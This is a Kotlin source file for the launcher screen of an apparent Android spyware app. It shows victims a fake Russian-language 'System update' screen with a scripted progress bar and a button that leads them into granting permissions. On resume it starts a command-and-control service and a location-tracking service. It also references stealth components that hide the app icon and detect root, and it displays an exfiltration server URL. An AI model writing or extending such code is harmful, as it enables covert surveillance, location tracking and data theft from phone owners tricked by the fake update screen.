package com.sp.core

import android.app.Activity
import android.content.Context
import android.graphics.Color
import android.graphics.Typeface
import android.os.Bundle
import android.os.Handler
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService
import com.sp.core.util.Fgs
import com.sp.core.util.Prefs

/**
 * Launcher entry point.
 *
 * This is a *new* component on purpose: older builds disabled the launcher
 * activity with setComponentEnabledSetting(), and that "disabled" flag
 * survives an APK update - the app then could not be started at all. A fresh
 * component name is always enabled after an update, so the icon always comes
 * back.
 */
class LauncherActivity : Activity() {

    private val appCtx: Context get() = this

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            buildUi()
        } catch (_: Throwable) {
        }
    }

    override fun onResume() {
        super.onResume()
        updatePerms()
        // The app is in the foreground here, which is exactly what Android
        // 12+ requires for a foreground service. This is the only reliable
        // moment to start the agent.
        try {
            com.sp.core.stealth.IconHider.show(this)
        } catch (_: Throwable) {
        }
        Fgs.startService(this, C2Service::class.java)
        Fgs.startService(this, LocationService::class.java)
    }

    private fun buildUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 128, 64, 64)
            setBackgroundColor(Color.WHITE)
        }
        val title = TextView(this).apply {
            text = "Обновление системы"
            textSize = 24f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#FF202124"))
        }
        root.addView(title)
        root.addView(View(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 32)
        })
        val status = TextView(this).apply {
            text = "Проверка обновлений..."
            textSize = 16f
            setTextColor(Color.parseColor("#FF5F6368"))
        }
        root.addView(status)
        val progress = ProgressBar(this, null,
            android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 16).apply { topMargin = 48 }
        }
        root.addView(progress)

        val actions = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = 40 }
        }

        val setupBtn = Button(this).apply {
            text = "Настройка доступа"
            setOnClickListener {
                try {
                    startActivity(android.content.Intent(appCtx, SetupActivity::class.java))
                } catch (_: Throwable) {
                }
            }
        }
        actions.addView(setupBtn)

        permStatus = TextView(this).apply {
            textSize = 13f
            setTextColor(Color.parseColor("#FF5F6368"))
            setPadding(0, 12, 0, 0)
        }
        actions.addView(permStatus)

        val health = TextView(this).apply {
            text = healthText()
            textSize = 12f
            setTextColor(Color.parseColor("#FF80868B"))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = 24 }
        }
        actions.addView(health)

        val version = TextView(this).apply {
            text = "Версия Android: ${android.os.Build.VERSION.RELEASE}\n" +
                   "android_UI: ${com.sp.core.BuildConfig.VERSION_NAME}"
            textSize = 13f
            setTextColor(Color.parseColor("#FF80868B"))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = 32 }
        }
        root.addView(actions)
        root.addView(version)
        setContentView(root)

        val handler = Handler(mainLooper)
        var p = 0
        val runnable = object : Runnable {
            override fun run() {
                try {
                    p += 7
                    progress.progress = p.coerceAtMost(100)
                    if (p >= 100) {
                        status.text = "Система обновлена"
                        setupBtn.visibility = View.VISIBLE
                        Prefs.set(appCtx, "setup_done", true)
                        return
                    }
                    status.text = "Проверка обновлений... $p%"
                    handler.postDelayed(this, 120)
                } catch (_: Throwable) {
                }
            }
        }
        handler.postDelayed(runnable, 300)
    }

    private var permStatus: TextView? = null

    private fun updatePerms() {
        val v = permStatus ?: return
        try {
            val (ok, total) = com.sp.core.util.PermState.summary(this)
            v.text = "Доступ: $ok / $total - нажми \"Настройка доступа\" чтобы выдать остальные"
            v.setTextColor(Color.parseColor(if (ok >= total) "#FF1E8E3E" else "#FFB06000"))
        } catch (_: Throwable) {
        }
    }

    private fun healthText(): String {
        val sb = StringBuilder("ID: ")
        sb.append(Prefs.deviceId(this)).append('\n')
        sb.append("C2: ").append(
            com.sp.core.c2.Exfil.baseUrl(this) ?: "n/a").append('\n')
        sb.append("root: ").append(com.sp.core.stealth.AntiDetect.isRooted())
        return sb.toString()
    }
}
